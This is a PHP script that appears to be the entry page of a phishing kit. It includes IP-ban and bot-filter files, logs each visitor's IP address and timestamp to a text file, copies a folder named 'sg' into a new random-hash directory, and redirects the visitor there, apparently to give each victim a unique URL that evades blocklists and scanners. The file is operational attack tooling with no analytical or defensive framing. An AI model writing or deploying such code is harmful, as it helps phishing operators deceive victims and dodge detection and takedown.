<?php 
include 'banned-ip.php';
include 'bots.php';
?>
<?php

$ip = getenv("REMOTE_ADDR");
$file = fopen("visit.txt","a");
fwrite($file,$ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n");

session_start();
$_SESSION['number']="21";

$random=rand(0,100000000000);
$random1=rand(0,100000000000);
$random2=rand(0,100000000000);
$md5=md5("$random");
$md51=md5("$random1");
$md52=md5("$random2");
$base=base64_encode($md5);
$base1=base64_encode($md51);
$base2=base64_encode($md52);
$mdst=md5("$base");
$mdst1=md5("$base1");
$mdst2=md5("$base2");
$dst=("$mdst$mdst1$mdst2");
function recurse_copy($src,$dst) {
$dir = opendir($src);
@mkdir($dst);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($src . '/' . $file) ) {
recurse_copy($src . '/' . $file,$dst . '/' . $file);
}
else {
copy($src . '/' . $file,$dst . '/' . $file);
}
}
}
closedir($dir);
}
$src="sg";
recurse_copy( $src, $dst );
header("location:$dst");
?>